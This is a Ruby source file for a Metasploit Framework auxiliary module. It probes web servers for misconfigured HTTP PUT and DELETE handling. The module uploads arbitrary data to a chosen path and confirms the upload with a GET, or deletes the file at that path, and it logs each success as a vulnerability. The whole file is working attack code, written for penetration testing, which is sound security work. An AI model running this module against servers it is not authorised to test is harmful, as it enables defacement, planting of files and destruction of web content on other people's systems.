##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanDir
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module can abuse misconfigured web servers to
			upload and delete web content via PUT and DELETE HTTP
			requests.
			},
			'Author'      => [ 'Kashif [at] compulife.com.pk',
					 ],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
					['PUT'],
					['DELETE']
				],
			'DefaultAction' => 	'PUT'		
		)
		
		register_options(
			[
				OptString.new('PATH', [ true,  "The path to attempt to write or delete", '/http_write.txt']),
				OptString.new('DATA', [ false,  "The data to upload into the file", ' '])
			], self.class)
	end

	# Test a single host
	def run_host(ip)

		target_host = ip
		target_port = datastore['RPORT']
		
		case action.name
		when 'PUT'
			begin
				res = send_request_cgi({
					'uri'          =>  datastore['PATH'],
					'method'       => 'PUT',
					'ctype'        => 'text/plain',
					'data'         => datastore['DATA']
				}, 20)

				return if not res
				if (res and res.code >= 200 and res.code < 300)
				
					#
					# Detect if file was really uploaded
					# 
	
					begin
						res = send_request_cgi({
							'uri'  		=>  datastore['PATH'],
							'method'   	=> 'GET',
							'ctype'		=> 'text/html'
						}, 20)

						return if not res
			
						tcode = res.code.to_i 

						if res and (tcode >= 200 and tcode <= 299)
							if res.body.include? datastore['DATA']
								print_status("Upload succeeded on #{wmap_base_url}#{datastore['PATH']} [#{res.code}]")
								
								report_note(
									:host	=> target_host,
									:proto	=> 'HTTP',
									:port	=> rport,
									:type	=> 'PUT_ENABLED',
									:data	=> "#{datastore['PATH']}"
								)
							
							end
						else
							print_status("Received a #{tcode} code but upload failed on #{wmap_base_url} [#{res.code} #{res.message}]")
						end
			
					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout		
					rescue ::Timeout::Error, ::Errno::EPIPE			
					end					
				else
					print_status("Upload failed on #{wmap_base_url} [#{res.code} #{res.message}]")
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE			
			end
			
		when 'DELETE'
			begin
				res = send_request_cgi({
					'uri'          => datastore['PATH'],
					'method'       => 'DELETE'
				}, 10)

				return if not res
				if (res and res.code >= 200 and res.code < 300)
					print_status("Delete succeeded on #{wmap_base_url}#{datastore['PATH']} [#{res.code}]")
					
					rep_id = wmap_base_report_id(
						wmap_target_host,
						wmap_target_port,
						wmap_target_ssl
					)
								
					wmap_report(rep_id,'VULNERABILITY','DELETE_ENABLED',"#{datastore['PATH']}","Delete succeeded on #{datastore['PATH']}")
				else
					print_status("Delete failed on #{wmap_base_url} [#{res.code} #{res.message}]")
				end

			rescue ::Rex::ConnectionError
			rescue ::Timeout::Error, ::Errno::EPIPE			
			end		
		end

	end

end
